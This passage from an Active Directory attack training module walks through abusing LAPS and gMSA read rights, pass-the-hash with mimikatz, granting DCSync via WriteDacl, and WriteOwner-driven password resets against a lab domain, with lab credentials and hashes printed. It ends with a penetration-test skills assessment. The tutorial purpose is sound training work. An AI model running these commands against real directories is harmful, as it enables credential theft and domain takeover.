LAPS02: y2QLPdd;T9u,]9
<SNIP>
LAPS09: Nzr$jIzT/JV4@!

```

Note: The above script will only show the LAPS password we can read for the user we are running the command as.

## Abusing ReadProperty from Linux

We can utilize the Python script [LAPSDumper](https://github.com/n00py/LAPSDumper) from Linux systems to read the `LAPS` password. By employing the `-c [COMPUTER]` option, we can specify a particular computer name for dumping, or exclude this option to retrieve passwords for all computers accessible by the user account being utilized.

#### Using LAPSDumper from Linux to Read the LAPS Password

```shell
git clone https://github.com/n00py/LAPSDumper -q
cd LAPSDumper
python3 laps.py -u rita -p Password123 -l 10.129.205.81 -d inlanefreight.local

LAPS Dumper - Running at 05-16-2023 08:19:43
LAPS01 s19I/p9J5@[F$s
LAPS02 y2QLPdd;T9u,]9
<SNIP>
LAPS09 Nzr$jIzT/JV4@

```

We can use these credentials to connect as administrators to the target computer and perform any operation to help us achieve our engagement goals.

## ReadGMSAPassword

`Group Managed Service Accounts` ( `gMSAs`) is a feature in Microsoft Active Directory that provides a secure and automated mechanism for managing service accounts used by applications and services running on Windows servers. Unlike regular service accounts, `gMSAs` have built-in password management and simplified key distribution, eliminating the need to manage and update passwords manually.

When a `gMSA` is created, it is associated with a specific Active Directory group, allowing multiple servers or applications to share the same `gMSA` for authentication. This association simplifies the administration and maintenance of service accounts across multiple systems.

A `gMSA` leverages a `secure key distribution process`, where the password is `automatically generated`, `securely stored`, and `periodically rotated` by the Active Directory domain controller. This eliminates the risk of the password being compromised or forgotten, reducing the attack surface and enhancing security.

By utilizing `gMSAs`, the associated principals (such as machine accounts, servers, or applications) are granted specific access rights through the use of a dedicated `DACLs` stored in the `msDS-GroupMSAMembership` attribute of the service account. These access rights can be tailored to meet the specific requirements of each principal, granting them access to the necessary resources and reducing the need for manual permission management.

If we get access to a principal (such as machine accounts, servers, or applications) that have access rights to use a `gMSA`, we can abuse it to obtain the group-managed service account password.

[dacledit.py](https://raw.githubusercontent.com/ShutdownRepo/impacket/dacledit/examples/dacledit.py) does not allow enumeration of this privilege. Therefore, let us use `BloodHound` to identify/enumerate it using a cypher query:

```cypher
MATCH p=((n)-[r:ReadGMSAPassword]->(m)) RETURN p

```

![read_gmsa_bloodhound.jpg](pqbbyT1QPwVz.jpg)

`BloodHound` establishes a path revealing that `Pedro` actively possesses the access right `ReadGMSAPassword` over three `gMSAs` accounts. This path signifies `Pedro`'s direct authority and control over these accounts, meaning we can use his account to retrieve those passwords.

## Abusing ReadGMSAPassword from Linux

In order to abuse the `ReadGMSAPassword` access right from a Linux environment, we can utilize [gMSADumper.py](https://github.com/micahvandeusen/gMSADumper). This script enables us to read and parse the values of any `gMSA` password blobs accessible to the invoking user.

#### Using gMSADumper.py

```shell
python3 gMSADumper.py -d inlanefreight.local -l 10.129.205.81 -u pedro -p SecuringAD01

```

We can then use `CrackMapExec` to validate the credentials we harvested. We can successfully authenticate as `jenkins-dev$`:

```shell
poetry run crackmapexec ldap 10.129.205.81 -u jenkins-dev$ -H 4d8bcd4f5c70fe71beb848b4ab124e61

```

## Abusing ReadGMSAPassword from Windows

A viable method for actively obtaining the password of the `GMSA` from Windows and converting it into its corresponding hashes involves using the [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) tool. This tool operates by reading the password blob from a `gMSA` account using LDAP and subsequently parsing the values into reusable hashes. After launching a `cmd.exe` as `Pedro` we can use this tool as follows:

#### Executing GMSAPasswordReader

```cmd-session
C:\Tools> whoami

inlanefreight\pedro
C:\Tools> GMSAPasswordReader.exe --accountname apache-dev

Calculating hashes for Old Value
[*] Input username             : apache-dev$
[*] Input domain               : INLANEFREIGHT.LOCAL
[*] Salt                       : INLANEFREIGHT.LOCALapache-dev$
[*]       rc4_hmac             : 999773E3B86DBFE4EE7105E6511779BC
[*]       aes128_cts_hmac_sha1 : 9277ED35A37ECE337145A756CD3CB10A
[*]       aes256_cts_hmac_sha1 : B6BB8AFDEF363CBBBFCE956BFA3E9EC0E218FE2D7EDC79BC45C9D5ACF37700D2
[*]       des_cbc_md5          : 2CB0CD012345C4AB

Calculating hashes for Current Value
[*] Input username             : apache-dev$
[*] Input domain               : INLANEFREIGHT.LOCAL
[*] Salt                       : INLANEFREIGHT.LOCALapache-dev$
[*]       rc4_hmac             : 69978088B44350772FEBDB1E3DAC6F39
[*]       aes128_cts_hmac_sha1 : 2F94E94252D53E3855688DAB1FEB5A52
[*]       aes256_cts_hmac_sha1 : 2AC5142F432B639104188A7343B50FA231F67E35531E7420253A78CE1221FA01
[*]       des_cbc_md5          : 6723764A616223BA

```

It is important to note that this action may yield multiple hashes, including one for the `old password` and another for the `current password`. It is worth considering that either of these values could be valid for subsequent operations.

Once the hashes has been obtained, it can be used similarly to a regular user account. Techniques such as `pass-the-hash` ( `PtH`) or `overpass-the-hash` ( `OtH`) can be performed, leveraging the hash as an input for various offensive operations.

Let's use mimikatz, located in `C:\Tools`, to perform an OverPass the Hash attack. The following command will open a PowerShell window that will contain the ticket of the GMSA account `apache-dev$`:

#### Using Mimikatz to perform OverPass-the-Hash

```cmd-session
C:\Tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:apache-dev$ /domain:inlanefreight.local /ntlm:69978088B44350772FEBDB1E3DAC6F39 /run:powershell.exe" exit

```

From this new window, we can start abusing the rights of `apache-dev$`.

Note: If we change a user group membership or assign new rights, we need to create a new session that holds the new rights. For example, if we added `apache-dev$` to a group and tried to use the PowerShell window we launched before the changes, it won't have the rights for the new group we assigned the account.


# Granting Rights and Ownership

In the context of Active Directory, specific permissions, such as `WriteDacl` and `Ownership`, play a crucial role in controlling access to objects and ensuring their security. The `WriteDacl` access right refers to the privilege that allows an account to modify the `DACL` of a target object. `Ownership` on the other hand denotes the state of possessing administrative control over an object. Understanding the significance of these access rights is essential as they can impact the vulnerability and potential abuses associated with the manipulated `DACL`.

Suppose we possess an account with privileges to modify a target object's `DACL` through the `ownership` or `WriteDacl` access rights. In that case, we can use that account to edit the target's `DACL` and make it vulnerable to other attacks.

In the following example, we hijacked an account with `WriteDacl` over the root domain object. We can use this access rights to grant us `DCSync` rights. The domain's `DACL`, if edited, can grant us enough rights to perform a [DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync) attack.

## Identifying Vulnerable Objects

We can use `BloodHound` to identify objects vulnerable to `WriteDacl` or with the edge `Owner`. Although we can use the cypher query we used before and replace it with `WriteDacl` or `Owner`, this may create many difficult paths to check. We can use the pathfinding option to identify the paths from the account we have control of to our target:

![luna_writedacl_domain.jpg](AxGm6QzJNDPs.jpg)

We can also use `PowerView` to identify if `Luna` has Active Directory rights over the domain `INLANEFREIGHT.LOCAL`. To do so, we will use the function `Get-DomainSID` and pass it to the function `Get-DomainObjectAcl`; this is because if we use `-Identity` `inlanefreight.local`, we will get a few more objects due to inheritance issues and the domain name appearing on those objects:

#### Querying Luna's DACL over the Domain

```powershell
PS C:\Tools> Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> $userSID = ConvertTo-SID luna
PS C:\Tools> Get-DomainSID | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}

AceType               : AccessAllowed

AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed

```

We can use `dacledit.py` to find those privileges, but instead of using the `-target` option, we will use `-target-dn` to specify the Domain Distinguished name:

#### Querying Luna's DACL over the Domain

```shell
python3 examples/dacledit.py -principal luna -target-dn dc=inlanefreight,dc=local -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123

```

## Abusing WriteDACL from Linux

The `WriteDacl` access right in the domain does not allow us to perform the `DCSync` attack, but we must use it to assign an account the rights to be able to perform the `DCSync`. To assign `DCSync` access rights to `Luna`'s account or any other account, we can use `dacledit.py` from Linux.

Before editing the domain's `DACL`, let us try to perform the `DCSync` attack using [secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) from [impacket](https://github.com/fortra/impacket):

#### Attempting DCSync before DACL Modification

```shell
secretsdump.py -just-dc-user krbtgt inlanefreight.local/luna:[email protected]

Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra

[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up...

```

Up until now, the only action we have done with `dacledit.py` has been querying `DACLs`; however, this tool also allows us to modify `DACLs`. We will use the `-action write` option to indicate that we want to modify the `DACL`, followed by the `-rights dcsync` option to indicate the access rights we want to assign to the account one we have selected.

#### Modify DACLs with dacledit.py

```shell
python3 examples/dacledit.py -principal luna -target-dn dc=inlanefreight,dc=local -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123 -action write -rights DCSync

[*] DACL backed up to dacledit-20230518-130322.bak
[*] DACL modified successfully!

```

Afterward, if we enumerate the `DACL`, we will be able to see that the access rights were indeed modified:

Once we edit the `DACL` for the Domain, we can perform `DCSync`:

## Abusing WriteDacl from Windows

On Windows, we can use `PowerView` to modify `DACLs`. We will use [PowerView](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1) or [SharpView](https://github.com/tevora-threat/SharpView) and the `Add-DomainObjectAcl` function with the option `-TargetIdentity $(Get-DomainSID)` to specify the object we want to modify, in this case, we are also querying the domain's SID with the function `Get-DomainSID`, next we need to specify the `-PrincipalIdenity luna` which is the account that we want to grant the rights and finally the option `-Rights DCSync`:

#### Modifying DACLs using PowerView

To perform `DCSync` from Windows, we can use [mimikatz](https://github.com/gentilkiwi/mimikatz):

## Abusing other Objects with WriteDacl

If we encounter some other objects such as a group or a user, we can assign `FullControl` over the object and abuse these access rights accordingly. Let us take as an example the `Finance group` over which `Luna` has `WriteDacl`. We will have to use `Luna`'s privileges to assign `FullControl` and then `add` a user to the group to abuse this privilege.

#### Querying Luna's DACLs over the Finance Group

Now we can add a user to the group using [addusertogroup](https://github.com/juliourena/ActiveDirectoryScripts/blob/main/Python/addusertogroup.py):

#### Using addusertogroup.py to add Luna to the Finance group

```shell
python3 addusertogroup.py -d inlanefreight.local -g "Finance" -a luna -u luna -p Moon123

[+] Connected to Active Directory successfully.
[+] Group Finance found.
[+] User luna found.
[+] User added to group successfully.

```

If we want to revert the `DACL` modification, we can use the backup file generated by `dacledit.py` when we performed the `write action`:

#### Restoring the DACL using the Backup File

```shell
python3 examples/dacledit.py -principal luna -target "Finance" -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123 -action restore -file dacledit-20230524-211441.bak

```

Note: Additionally, starting in BloodHound 4.3.1, the help menu provides steps for both Linux and Windows on how to abuse access rights.

## Grant ownership

We obtained access to an account with the `WriteOwner` access right over a target object. This particular account allows us to modify the `owner` of the target object, specifically the `OwnerSid` sub-attribute within the object's `security descriptor`. Exploiting this `access right` opens up possibilities for various abuses, depending on the target object: if we have `WriteOwner` over a `user` we can assign all rights to another account (which will allow us to perform a `Password Reset` or `targeted Kerberoasting`), if it is a `group` we can add or remove members, and if it is a `GPO` we can modify it.

Note: GPO Attacks as well other DACL abuses (such as computer attacks) will be covered in other DACL Attacks mini-modules.

The `WriteOwner` access right allows us to modify the object's owner; however, when using `dacledit.py` or `PowerView`, these tools will not show us any access rights we can abuse. For example, `Lilia` is the owner of the group `Managers`, if we use `PowerView` or `dacledit.py`, we will not get any result if we look for the object `DACL`:

#### Query Lilia's DACL over Managers with dacledit.py

```shell
python3 examples/dacledit.py -principal lilia -target Managers -dc-ip 10.129.205.81 inlanefreight.local/lilia:DACLPass123

#### Query Lilia's DACL over Managers with PowerView

```powershell
PS C:\Tools> Get-DomainObjectAcl -Identity Managers -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $LiliaSID}

VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL

VERBOSE: [Get-DomainObjectAcl] Get-DomainObjectAcl filter string: (&(|(|(samAccountName=Managers)(name=Managers)(displayname=Managers))))

```

However, we can use `BloodHound` to detect this relationship:

![lilia_owns_managers_bloodhound.jpg](f4nI1dlkjAlS.jpg)

## Identifying Vulnerable Objects

Suppose that we successfully gained access to `Pedro`, an account with `WriteOwner` over the user account `GPOADMIN`.

First, we will use `BloodHound` with a cypher query to identify those access rights. We include `n:User` so that `BloodHound` returns only paths created from a user object. We can do the same with groups; however, that will create too many paths, making it more challenging to analyze.

```cypher
MATCH p=((n:User)-[r:WriteOwner]->(m)) RETURN p

```

![writeowner_user.jpg](XeZRbmgYj26M.jpg)

Similarly, we can use `dacledit.py` and `PowerView` to identify those access rights:

#### Querying Pedro's DACL over the User GPOAdmin using dacledit.py

```shell
python3 examples/dacledit.py -principal pedro -target GPOAdmin -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01

```

Before editing the target's `Owner` and `DACL`, let us try to perform a password reset to confirm that we do not have such privileges:

#### Password Reset Attempt to the GPOAdmin Account

```shell
net rpc password GPOAdmin Mynewpassword1 -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81

Failed to set password for 'GPOAdmin' with error: Access is denied..

```

## Abusing WriteOwner from Linux

From Linux, we can use [Impacket](https://github.com/SecureAuthCorp/impacket)'s [owneredit.py](https://raw.githubusercontent.com/ShutdownRepo/impacket/owneredit/examples/owneredit.py) python script. At the time of writing, the [pull request #1323](https://github.com/SecureAuthCorp/impacket/pull/1323) offering this tool is still being reviewed. `owneredit.py` has the following main command-line arguments:

- `-action` defines the operation to perform. It can be `-action read` or `-action write`. In this case, we will set it to `read`. If no argument is set, the default is `read`.
- `-target`, `-target-sid`, or `-target-dn` respectively define the `sAMAccountName`, `Security Identifier`, or `Distinguished Name` of the object from which the `DACL` must be retrieved and parsed.
- `-new-owner`, `-new-owner-sid`, or `-new-owner-dn` respectively define the `sAMAccountName`, `Security Identifier`, or `Distinguished Name` of the object to set as the new owner of the target object.

Let us download the tool directly from [ShutdownRepo/Impacket](https://github.com/ShutdownRepo/impacket/blob/owneredit/examples/owneredit.py) and save it in the same folder where we have `dacledit.py` and execute the attack:

#### Downloading and Using owneredit.py

```shell
wget -q https://raw.githubusercontent.com/ShutdownRepo/impacket/owneredit/examples/owneredit.py -O ./shutdownRepo/impacket/examples/owneredit.py
python3 examples/owneredit.py -action write -new-owner pedro -target GPOAdmin -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] Current owner information below
[*] - SID: S-1-5-21-1267651629-1192007096-1618970724-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] OwnerSid modified successfully!

```

Once the `owner` is changed, the `Pedro` account does not have (yet) enough access rights to conduct a password reset. However, the ownership of the target object allows for editing its `DACL` and grant the necessary rights. Let us grant `Pedro` the access right to perform a password reset. `dacledit.py` allow us to modify a `DACL` and add the following predefined rights: `FullControl`, `ResetPassword`, `WriteMembers`, and `DCSync`, but we can also use the `-rights-guid` option to specify any other extended access right manually. `FullControl` is the default access right (use the help menu to get more information). Let us grant `Pedro` `FullControl` over the `GPOAdmin` account:

#### Changing User Rights with dacledit.py

```shell
python3 examples/dacledit.py -principal pedro -target GPOAdmin -action write -rights FullControl -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] DACL backed up to dacledit-20230519-095451.bak
[*] DACL modified successfully!

```

Now, we can perform the password reset and test that the credentials are correct:

#### Password Reset GPOAdmin

```shell
net rpc password GPOAdmin Mynewpassword1 -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81
poetry run crackmapexec ldap 10.129.205.81 -u GPOAdmin -p Mynewpassword1

SMB         10.129.205.81   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        10.129.205.81   389    DC01             [+] INLANEFREIGHT.LOCAL\GPOAdmin:Mynewpassword1

```

## Abusing WriteOwner from Windows

From Windows, we can change a target object's `owner` with [Set-DomainObjectOwner](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObjectOwner/) from the [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1).

#### Setting the Object Owner with PowerView

```powershell
PS C:\Tools> Set-DomainObjectOwner -Identity GPOAdmin -OwnerIdentity pedro -Verbose

VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=pedro)(name=pedro)(displayname=pedro))))
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=GPOAdmin)(name=GPOAdmin)(displayname=GPOAdmin))))
VERBOSE: [Set-DomainObjectOwner] Attempting to set the owner for 'GPOAdmin' to 'pedro'

```

To edit another object's `DACL`, we can use the [Add-DomainObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/) function from [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1). The `PowerView` `-Rights` option supports `All`, `ResetPassword`, `WriteMembers`, and `DCSync` (notice that `PowerView` uses `All` instead of `FullControl`, but they are identical). Alternatively, we can use the option `-RightsGUID` to manually specify the extended access rights we want to apply:

#### Modifying GPOAdmin's DACL

```powershell
PS C:\Tools> Add-DomainObjectAcl -TargetIdentity GPOAdmin -PrincipalIdentity pedro -Rights All -Verbose

VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=pedro)(name=pedro)(displayname=pedro))))
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=GPOAdmin)(name=GPOAdmin)(displayname=GPOAdmin))))
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=Pedro Valt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 'All' on
CN=GPOAdmin,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=Pedro Valt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL rights GUID
'00000000-0000-0000-0000-000000000000' on CN=GPOAdmin,CN=Users,DC=INLANEFREIGHT,DC=LOCAL

```

Now we can use `net` to perform the password reset.

#### Password Reset using net

```cmd-session
C:\Tools> net user GPOAdmin Tryanotherpassword123 /domain

The command completed successfully.

```


# Skills Assessment

It is time to chain together all the `DACL` abuses and attacks covered throughout the module.

## Scenario

`Inlanefreight`, a company that delivers customized global freight solutions, recently terminated one of its systems administrators after several discussions, meetings, and training sessions due to not implementing nor following AD security best practices. Specifically, this sysadmin was known to spray privileged and unnecessary access rights to all objects within the network, violating the principle of least privilege. Therefore, they are worried that might an adversary breaches them, the consequences would be unbearable.

Knowing that you deeply understand AD security and excel at attacking misconfigured `DACLs`, they contacted you so that you perform a penetration test against their AD environment. They want you to focus mainly on auditing the `DACLs` of the various network objects.

For this internal assessment, `Inlanefreight` has provided you with a computer named `WS01` and an account named `carlos`. To connect to `WS01`, you must use the target IP address and the RDP port `13389`. After connecting, you will start enumerating and attacking `Inlanefreight`'s AD environment to evaluate their security.

## Rules of Engagement

The company has one particular rule of engagement that must be complied with throughout the penetration test. Breaching it renders the contract revoked. You must comply with the following:

- `Do not reset the passwords of users`.

Note: You can perform the enumeration and attacks from both Linux and Windows. BloodHound and all tools needed to complete the lab are located in C:\\Tools\\. BloodHound credentials are neo4j:Password123
